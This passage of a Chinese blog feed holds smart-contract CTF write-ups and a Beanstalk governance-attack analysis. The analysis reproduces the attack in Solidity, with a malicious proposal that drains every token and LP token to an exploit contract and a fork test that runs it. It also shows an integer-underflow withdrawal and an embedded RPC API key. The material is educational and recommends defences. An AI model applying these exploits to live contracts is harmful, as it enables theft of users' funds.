punctuation">}</span><span class="token punctuation">)</span>pendingtx<span class="token punctuation">(</span>tx<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时，我们的<code>overallBalances</code>为<code>10 ethers</code>，<code>lockedBalances</code>为<code>7 ethers</code>。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">tx <span class="token operator">=</span> DEX<span class="token punctuation">.</span>functions<span class="token punctuation">.</span>buyOrderMarket<span class="token punctuation">(</span><span class="token string">"DAIUHTK"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">*</span><span class="token number">10</span><span class="token operator">**</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">.</span>buildTransaction<span class="token punctuation">(</span><span class="token punctuation">{</span>    <span class="token string">'from'</span><span class="token punctuation">:</span> accout<span class="token punctuation">.</span>address<span class="token punctuation">,</span>    <span class="token string">'nonce'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>getTransactionCount<span class="token punctuation">(</span>accout<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'gas'</span><span class="token punctuation">:</span> <span class="token number">8000000</span><span class="token punctuation">,</span>    <span class="token string">'gasPrice'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>toWei<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'gwei'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span>pendingtx<span class="token punctuation">(</span>tx<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>DEX<span class="token punctuation">.</span>functions<span class="token punctuation">.</span>balanceOf<span class="token punctuation">(</span>uhtk_addr<span class="token punctuation">,</span>accout<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 115792089237316195423570985008687907853269984665640564039456584007913129639936</span>````可以看到我们的uhtk的余额已经下溢到了一个非常大的数值，这时我们通过withdraw操作，就可以转出大量的Token。```pythontx <span class="token operator">=</span> DEX<span class="token punctuation">.</span>functions<span class="token punctuation">.</span>withdraw<span class="token punctuation">(</span>uhtk_addr<span class="token punctuation">,</span> <span class="token number">100000</span><span class="token operator">*</span><span class="token number">10</span><span class="token operator">**</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">.</span>buildTransaction<span class="token punctuation">(</span><span class="token punctuation">{</span>    <span class="token string">'from'</span><span class="token punctuation">:</span> accout<span class="token punctuation">.</span>address<span class="token punctuation">,</span>    <span class="token string">'nonce'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>getTransactionCount<span class="token punctuation">(</span>accout<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'gas'</span><span class="token punctuation">:</span> <span class="token number">8000000</span><span class="token punctuation">,</span>    <span class="token string">'gasPrice'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>toWei<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'gwei'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span>pendingtx<span class="token punctuation">(</span>tx<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到flag<br><code>DECURITY{d3xus_1s_4w3s0m3}</code></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Unchecked的关键字虽然可以省gas，但是也带来了很大风险。在实际使用中，建议反复检查，避免出现这种情况。<br>尤其是在Unchecked中做大量运算时，以及用户可以控制Unchecked块的内容时，一定要小心。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>从Benstalks攻击事件浅谈治理合约的安全问题</title>
      <link href="/2023/03/04/governace/"/>
      <url>/2023/03/04/governace/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>Governance 顾名思义，即为治理。区块链的出现，让去中心化的治理成为一个新的方向，即我们所说的DAO(Decentralized Autonomous Organization)。</p><p>链上治理可以让社区的成员参与到治理中来，让社区的成员更加的自治，更加的去中心化。提案的种类也有很多，比如参数修改、合约升级、资源管理等。</p><p>这一讲我们将首先分析链上治理的过程，让大家了解治理的过程，然后通过一道赛题来了解到链上治理可能面临的风险漏洞。</p><h1 id="Compound-Governance-protocol"><a href="#Compound-Governance-protocol" class="headerlink" title="Compound Governance protocol"></a>Compound Governance protocol</h1><p>作为经典的治理协议，openzeppelin的治理沿用了Compound的治理协议，具体文档为：<a href="https://docs.openzeppelin.com/contracts/4.x/api/governance">https://docs.openzeppelin.com/contracts/4.x/api/governance</a></p><p>在这里我们简要介绍一下协议。</p><h2 id="ERC20Votes"><a href="#ERC20Votes" class="headerlink" title="ERC20Votes"></a>ERC20Votes</h2><p>ERC20Votes 是 ERC20 token的一个拓展，ERC20Votes token 即代表了<strong>投票权</strong>，其最大特点就是维护了一个checkpoint数组，记录了用户余额快照，这允许将<strong>投票权映射到过去余额的快照而不是当前余额</strong>，这有助于防止知道有重要提案即将出现并试图通过购买更多代币然后抛售它们来增加他们的投票权的成员投票。</p><p>同时还拥有delegate()委托函数：传入delegatee参数，<strong>将自己的投票权委托给delegatee</strong></p><h2 id="Governor"><a href="#Governor" class="headerlink" title="Governor"></a>Governor</h2><p>治理者合约决定了法定人数所需的投票数量的百分比(例如，如果法定人数是4%，那么只有4%的选民需要投票支持提案通过)，投票期限，即投票持续多长时间，投票延迟，即提案创建后多长时间允许成员更改他们拥有的代币数量。治理合约还提供创建提案、投票和执行提案的功能。</p><p>而一个提案的生命周期，可以用下图表示。</p><p><img src="/../img/gov_diagram.png"></p><p>这里介绍几个关键函数</p><ul><li><p>propose() 提案函数：满足代币持有量的可以提案，须传入address, value, signature, calldata等参数</p></li><li><p>castVote() 投票函数：传入proposalId, support参数，含有for, against, abstain三种选择</p></li><li><p>queue() 队列函数：提案成功后，任何人可以调用，传入proposalId参数，将提案加入队列</p></li><li><p>execute() 执行函数：当时间满足要求后，任何人都可以调用，传入proposalId参数，将提案从队列中取出执行</p></li></ul><h2 id="Timelock"><a href="#Timelock" class="headerlink" title="Timelock"></a>Timelock</h2><ul><li>delay(延时)：一个提案被接受后，需要等待多少天之后才能被执行。这个时间可以由治理合约改变为2至30天之间。目前设置为2天。</li><li>提案执行期限(grace period)：在延时到达时间之后，如果超过了grace period期，那么提案将不能再执行，被设置为14天。</li></ul><h1 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h1><p>去中心化的治理在带来民主的同时，由于提案投票权利的分散，也带来了安全性的问题。因此，治理协议的安全性是一个非常重要的问题。</p><p>想象一下，如果黑客可以通过恶意提案、大量投票从而达到控制项目、转移资产，后果是不堪设想的。</p><p>在我之前的写过的AAADAO的wp中，就是一个典型的治理合约闪电贷攻击，感兴趣的朋友可以看看。</p><h2 id="真实案例"><a href="#真实案例" class="headerlink" title="真实案例"></a>真实案例</h2><h3 id="The-Beanstalk-Hack"><a href="#The-Beanstalk-Hack" class="headerlink" title="The Beanstalk Hack"></a>The Beanstalk Hack</h3><p>2022年4月，Beanstalk被治理攻击，损失了181w$。并且，黑客捐赠了25万给了乌克兰战争基金地址。</p><p>起因是治理协议中含有<code>emergencyCommit</code>紧急执行函数，周期为一天，当有2/3的赞成票时即可立即执行，如下图。</p><p><img src="/../img/gov_1.jpg" alt="image"></p><p>首先，黑客进行了恶意提案，提案内容为偷走合约中所有的钱，下图标出了恶意提案地址和提案执行签名。</p><p><img src="/../img/gov_2.png" alt="image"></p><p>而再在治理协议中，投票权重由向Beanstalk协议的Diamond contract的捐赠决定。于是在一天之后，黑客发起了攻击。<br>黑客的主要攻击流程为：</p><ul><li>通过闪电贷获得DAI，USDT，USDC</li><li>再次通过uniswap，sushiswap 闪电贷得到BEAN 和 LUSD</li><li>使用DAI，USDT，USDC换取 3CRV</li><li>再将3CRV，LUSD，BEAN换取BEAN3CRV-f，BEANLUSD-f</li><li>将BEAN3CRV-f，BEANLUSD-f存入Diamond 中</li><li><strong>对BIP18恶意提案进行投票</strong></li><li>执行恶意提案，将BEAN3CRV-f，BEANLUSD-f，uni-v2发送给黑客合约</li><li>通过兑换将BEAN3CRV-f，BEANLUSD-f换取USDT，USDC，DAI</li><li>burn uni-v2换取ETH和BEAN</li><li>偿还闪电贷，再将多余的代币换为ETH，黑客获利</li><li><em>黑客还发送了25000USDT给了乌克兰战争基金地址</em></li></ul><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="恶意提案"><a href="#恶意提案" class="headerlink" title="恶意提案"></a>恶意提案</h3><pre class="line-numbers language-solididy" data-language="solididy"><code class="language-solididy">// SPDX-License-Identifier: MITpragma solidity 0.8.10;import "forge-std/Test.sol";import {IERC20} from "../interfaces/IERC20.sol";contract BIP18 is Test {    address constant BEAN = address(0xDC59ac4FeFa32293A95889Dc396682858d52e5Db);    address constant BEAN_STALK = address(0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5);    address constant BEANCRV_F =        address(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD);    address constant BEANLUSD_F =        address(0xD652c40fBb3f06d6B58Cb9aa9CFF063eE63d465D);    address constant PROPOSER =        address(0x1c5dCdd006EA78a7E4783f9e6021C32935a10fb4);    address constant UNI_V2_BEAN_LP =        address(0x87898263B6C5BABe34b4ec53F22d98430b91e371);    address immutable EXPLOIT_CONTRACT;    constructor(address _exploitAddr) {        EXPLOIT_CONTRACT = _exploitAddr;    }    function init() external {        console.log("exploit contract address: ", EXPLOIT_CONTRACT);        IERC20(BEAN).transfer(EXPLOIT_CONTRACT, IERC20(BEAN).balanceOf(BEAN_STALK));        IERC20(UNI_V2_BEAN_LP).transfer(EXPLOIT_CONTRACT, IERC20(UNI_V2_BEAN_LP).balanceOf(BEAN_STALK));        IERC20(BEANCRV_F).transfer(EXPLOIT_CONTRACT, IERC20(BEANCRV_F).balanceOf(BEAN_STALK));        IERC20(BEANLUSD_F).transfer(EXPLOIT_CONTRACT, IERC20(BEANLUSD_F).balanceOf(BEAN_STALK));        // 偷走所有tokens &amp; LP tokens    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="恶意提案执行"><a href="#恶意提案执行" class="headerlink" title="恶意提案执行"></a>恶意提案执行</h3><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token number">0.8</span><span class="token number">.10</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"../src/BIP18.sol"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"../src/attack.sol"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"forge-std/Test.sol"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"../interfaces/IUniswapV2Router.sol"</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">BeanExp</span> <span class="token keyword">is</span> Test<span class="token punctuation">{</span>    IBeanStalk <span class="token keyword">constant</span> BEAN_STALK <span class="token operator">=</span> <span class="token function">IBeanStalk</span><span class="token punctuation">(</span><span class="token number">0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token builtin">address</span> <span class="token keyword">constant</span> BEAN <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0xDC59ac4FeFa32293A95889Dc396682858d52e5Db</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    IUniswapV2Router <span class="token keyword">constant</span> uniswapv2 <span class="token operator">=</span> <span class="token function">IUniswapV2Router</span><span class="token punctuation">(</span><span class="token keyword">payable</span><span class="token punctuation">(</span><span class="token number">0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token builtin">string</span>  url <span class="token operator">=</span> <span class="token string">"https://eth-mainnet.g.alchemy.com/v2/qb4zUY4FDtmZMhaAEHblyllY9gc1nj2S"</span><span class="token punctuation">;</span>    <span class="token builtin">uint256</span> forkId<span class="token punctuation">;</span>    BIP18 bip18<span class="token punctuation">;</span>    BeanExploit beanexp<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">setUp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">{</span>        <span class="token comment">// 恶意提案高度  14595906 </span>        <span class="token comment">// 攻击开始高度  14602789</span>        forkId <span class="token operator">=</span> vm<span class="token punctuation">.</span><span class="token function">createFork</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token number">14595905</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        vm<span class="token punctuation">.</span><span class="token function">selectFork</span><span class="token punctuation">(</span>forkId<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">testexp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span><span class="token punctuation">{</span>        <span class="token builtin">address</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">memory</span> path <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">address</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        path<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> uniswapv2<span class="token punctuation">.</span><span class="token function">WETH</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        path<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> BEAN<span class="token punctuation">;</span>        uniswapv2<span class="token punctuation">.</span>swapExactETHForTokens<span class="token punctuation">{</span>value<span class="token punctuation">:</span> <span class="token number">75</span> ether<span class="token punctuation">}</span><span class="token punctuation">(</span>            <span class="token number">0</span><span class="token punctuation">,</span>            path<span class="token punctuation">,</span>            <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            block<span class="token punctuation">.</span>timestamp <span class="token operator">+</span> <span class="token number">120</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>            <span class="token string">"swap ETH -&gt; BEAN , Bean balance of attacker:"</span><span class="token punctuation">,</span>            <span class="token function">IERC20</span><span class="token punctuation">(</span>BEAN<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">10</span><span class="token operator">**</span><span class="token number">6</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">IERC20</span><span class="token punctuation">(</span>BEAN<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>BEAN_STALK<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">type</span><span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span><span class="token punctuation">.</span>max<span class="token punctuation">)</span><span class="token punctuation">;</span>        BEAN_STALK<span class="token punctuation">.</span><span class="token function">depositBeans</span><span class="token punctuation">(</span><span class="token function">IERC20</span><span class="token punctuation">(</span>BEAN<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        beanexp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BeanExploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bip18 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BIP18</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>beanexp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        IDiamondCut<span class="token punctuation">.</span>FacetCut<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">memory</span> _cut <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">IDiamondCut</span><span class="token punctuation">.</span>FacetCut<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        BEAN_STALK<span class="token punctuation">.</span><span class="token function">propose</span><span class="token punctuation">(</span>_cut<span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span>bip18<span class="token punctuation">)</span><span class="token punctuation">,</span> abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span><span class="token string">"init()"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Successfully proposed: "</span><span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span>bip18<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        vm<span class="token punctuation">.</span><span class="token function">warp</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>timestamp <span class="token operator">+</span> <span class="token number">1</span> days<span class="token punctuation">)</span><span class="token punctuation">;</span>        beanexp<span class="token punctuation">.</span><span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里使用了forge的warp cheatcode，可以将timpstamp设置到一天之后，模拟真实场景。</p><p>Expolit合约的代码就是一些闪电贷的Callback，投票并且执行提案，最后将一些token swap回ETH，这里不再赘述。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Defi治理实现了”区块链民主”，但是在带来民主的同时也带来了风险。对于治理合约管理者，要再三警惕恶意提案。同时，延迟执行链上治理也是防止恶意提案的一种方法，来保证组织资金的安全。这里我们给出几点建议。</p><p>（1）将投票和执行分离，保证投票和执行不在同一个区块时间，即不能在同一笔交易内同时完成投票和执行，这样也可以避免闪电贷带来的风险。</p><p>（2）增加权限，禁止合约投票，只能够通过EOA账户来投票，这样就可以规避闪电贷带来的影响。</p><p>（3）项目方以及社区成员应高度关注所有提案，对于有风险的提案，<br>应及时做出反应以及通知，尽可能的杜绝恶意提案的执行。</p><p>（4）在项目上线运行前，可以进行多次全面的合约审计，尽可能的保证合约的安全性。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>拟态强网区块链wp</title>
      <link href="/2022/11/07/ni-tai-qiang-wang-qu-kuai-lian-wp/"/>
      <url>/2022/11/07/ni-tai-qiang-wang-qu-kuai-lian-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="ToBeEquel"><a href="#ToBeEquel" class="headerlink" title="ToBeEquel"></a>ToBeEquel</h1><p>本题逻辑比较简单，考点主要是ABI编码和特殊地址的生成。</p><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">ToBeEquel</span> <span class="token punctuation">{</span>        <span class="token builtin">address</span> <span class="token keyword">private</span> owner<span class="token punctuation">;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balances<span class="token punctuation">;</span>    <span class="token builtin">uint</span> <span class="token keyword">private</span> last_balance<span class="token punctuation">;</span>    <span class="token keyword">event</span> <span class="token function">ForFlag</span><span class="token punctuation">(</span><span class="token builtin">address</span> addr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>        balances<span class="token punctuation">[</span>owner<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token keyword">modifier</span> onlyOwner <span class="token punctuation">{</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner <span class="token operator">||</span> msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"not authorized"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">_</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token keyword">function</span> <span class="token function">CallTest</span><span class="token punctuation">(</span><span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">string</span> <span class="token keyword">memory</span> customFallback<span class="token punctuation">,</span> <span class="token builtin">bytes</span> <span class="token keyword">memory</span> data<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_isContract</span><span class="token punctuation">(</span>to<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token punctuation">(</span><span class="token builtin">bool</span> success<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> to<span class="token punctuation">.</span>call<span class="token punctuation">{</span>value<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">(</span>                abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span>customFallback<span class="token punctuation">,</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> data<span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">assert</span><span class="token punctuation">(</span>success<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>        <span class="token keyword">function</span> <span class="token function">_isContract</span><span class="token punctuation">(</span><span class="token builtin">address</span> addr<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token builtin">uint</span> length<span class="token punctuation">;</span>        <span class="token keyword">assembly</span> <span class="token punctuation">{</span>            length <span class="token operator">:=</span> <span class="token function">extcodesize</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>length <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token keyword">function</span> <span class="token function">_Cal</span><span class="token punctuation">(</span><span class="token builtin">uint</span> value<span class="token punctuation">,</span> <span class="token builtin">uint</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> onlyOwner <span class="token punctuation">{</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>tx<span class="token punctuation">.</span>origin<span class="token punctuation">]</span><span class="token operator">&lt;</span>balances<span class="token punctuation">[</span>owner<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>tx<span class="token punctuation">.</span>origin<span class="token punctuation">]</span><span class="token operator">&gt;=</span>last_balance<span class="token punctuation">)</span><span class="token punctuation">;</span>        balances<span class="token punctuation">[</span>owner<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token builtin">uint</span><span class="token punctuation">(</span>value <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        balances<span class="token punctuation">[</span>tx<span class="token punctuation">.</span>origin<span class="token punctuation">]</span> <span class="token operator">+=</span> amount<span class="token punctuation">;</span>        last_balance <span class="token operator">=</span> balances<span class="token punctuation">[</span>tx<span class="token punctuation">.</span>origin<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">{</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>owner<span class="token punctuation">]</span><span class="token operator">==</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">emit</span> <span class="token function">ForFlag</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目中首先给<code>owner</code>地址余额500，拿到flag的要求需要使余额和<code>owner</code>一样</p><p>其中<code>_Cal</code>函数可以减少owner余额，并且增加自己的余额。但题目中除了<code>CallTest</code>函数之外都有<code>onlyOwner</code>修饰符。而<code>CallTest</code>函数的作用是可以对传入的<strong>合约地址任意执行</strong></p><p>进一步我们发现可以通过<code>CallTest</code>调用 <code>_Cal</code> 来bypass <code>onlyOwner</code>的要求。我们传入的<code>data</code>的内存结构为</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">feb6d173                -&gt; signatureaddress(msg.sender)     -&gt; caller address0x40                    -&gt; offset of data0x20                    -&gt; length of datadata                    -&gt; data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以我们会发现每次调用<code>_Cal</code>函数时，自己余额增加永远都是64(0x40)，这里对ABI编码不熟悉的话自己实验一下也会发现，无论传入值是多少，增加的总是64</p><p>同时根据函数逻辑，<code>owner</code>减少的值为地址的后两位。所以我们对于地址的选择也是有讲究的。</p><p>由于$500-64=436&gt;255$显然一次操作不能满足要求，所以$(500-128)/2=186$，我们需要找到地址末位为186(0xba)的地址。</p><h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> web3 <span class="token keyword">import</span> Web3<span class="token punctuation">,</span> HTTPProviderw3 <span class="token operator">=</span> Web3<span class="token punctuation">(</span>HTTPProvider<span class="token punctuation">(</span><span class="token string">'http://140.210.217.225:8545'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">assert</span> w3<span class="token punctuation">.</span>isConnected<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    ac <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>account<span class="token punctuation">.</span>create<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>ac<span class="token punctuation">.</span>address<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span> <span class="token operator">==</span> <span class="token number">186</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>ac<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>ac<span class="token punctuation">.</span>privateKey<span class="token punctuation">.</span><span 